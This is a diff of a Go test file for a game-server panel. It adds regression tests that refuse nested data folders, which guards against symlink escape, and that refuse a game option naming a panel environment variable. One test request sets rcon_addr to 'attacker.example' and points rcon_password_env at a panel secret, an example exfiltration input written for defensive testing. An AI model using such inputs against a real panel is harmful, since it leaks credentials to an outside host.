@@ -19,6 +19,7 @@ import (
 	"github.com/fiddler110/crowsnest/internal/dockerguard"
 	"github.com/fiddler110/crowsnest/internal/games"
 	"github.com/fiddler110/crowsnest/internal/modules"
+	"github.com/fiddler110/crowsnest/internal/probes"
 )
 
 const policy = `
@@ -788,5 +789,72 @@ func TestWindrosePreviewGivesHostSteps(t *testing.T) {
 	}
 	if plan, _ = m.Preview(windroseReq); plan.Setup[0].Done == nil || !*plan.Setup[0].Done {
 		t.Errorf("step not marked done: %+v", plan.Setup[0])
+	}
+}
+
+// A game whose data folder lies inside another game's (or holds it) is refused
+// up front: the guard would reject its scope, because a container that writes
+// the outer folder can turn the inner one into a symlink to the host.
+func TestDataFolderMayNotNestInAnotherGame(t *testing.T) {
+	m, _ := newManager(t)
+	a := Request{ID: "gs-one", Module: "minecraft", Options: map[string]string{"eula": "TRUE"}, Secrets: map[string]string{"rcon_password": "x"}}
+	if err := m.Enable(a); err != nil {
+		t.Fatal(err)
+	}
+	waitState(t, m, "gs-one", StateReady)
+	for _, dir := range []string{"gs-one/x", "gs-one/x/y"} {
+		b := Request{ID: "gs-two", Module: "minecraft", Options: map[string]string{"eula": "TRUE", "ports": "25570:25565/tcp", "data_dir": dir},
+			Secrets: map[string]string{"rcon_password": "y"}}
+		if err := m.Enable(b); err == nil || !strings.Contains(err.Error(), "inside") {
+			t.Errorf("data_dir %s inside gs-one's folder: %v", dir, err)
+		}
+	}
+	// the other way round: gs-one lives in /srv/games/gs-one, so a game in /srv/games is refused by the policy
+	// already; one whose folder holds a deeper game is refused here
+	c := Request{ID: "gs-three", Module: "minecraft", Options: map[string]string{"eula": "TRUE", "ports": "25571:25565/tcp", "data_dir": "deep/a"},
+		Secrets: map[string]string{"rcon_password": "z"}}
+	if err := m.Enable(c); err != nil {
+		t.Fatal(err)
+	}
+	waitState(t, m, "gs-three", StateReady)
+	d := Request{ID: "gs-four", Module: "minecraft", Options: map[string]string{"eula": "TRUE", "ports": "25572:25565/tcp", "data_dir": "deep"},
+		Secrets: map[string]string{"rcon_password": "w"}}
+	if _, err := m.Preview(d); err == nil || !strings.Contains(err.Error(), "inside") {
+		t.Errorf("a folder holding gs-three's was accepted: %v", err)
+	}
+}
+
+// A dashboard game reads only its own secrets: an option naming another
+// variable of the panel's environment (rcon_password_env) must not make the
+// panel send that variable's value (an OAuth client secret, a webhook URL)
+// as the game's RCON password to an address the same form chose.
+func TestGameCannotReadThePanelEnvironment(t *testing.T) {
+	t.Setenv("CROWSNEST_TEST_PANEL_SECRET", "s3cret")
+	m, _ := newManager(t)
+	req := Request{ID: "gs-one", Module: "minecraft",
+		Options: map[string]string{"eula": "TRUE", "rcon_addr": "attacker.example:25575", "rcon_password_env": "CROWSNEST_TEST_PANEL_SECRET"},
+		Secrets: map[string]string{"rcon_password": "own"}}
+	if err := m.Enable(req); err != nil {
+		t.Fatal(err)
+	}
+	waitState(t, m, "gs-one", StateReady)
+	def, ok := m.Registry.Get("gs-one")
+	if !ok {
+		t.Fatal("not registered")
+	}
+	rc, ok := def.RawConsole.(*probes.RawRCON)
+	if !ok {
+		t.Fatalf("raw console is %T", def.RawConsole)
+	}
+	if rc.Password == "s3cret" {
+		t.Fatal("the game's RCON password was read from another variable of the panel's environment")
+	}
+	// its own variable still works
+	lookup := m.lookup(m.find("gs-one"))
+	if v, _ := lookup("GS_ONE_RCON_PASSWORD"); v != "own" {
+		t.Errorf("own secret: %q", v)
+	}
+	if v, ok := lookup("CROWSNEST_TEST_PANEL_SECRET"); ok || v != "" {
+		t.Errorf("container env lookup read the panel's environment: %q", v)
 	}
 }
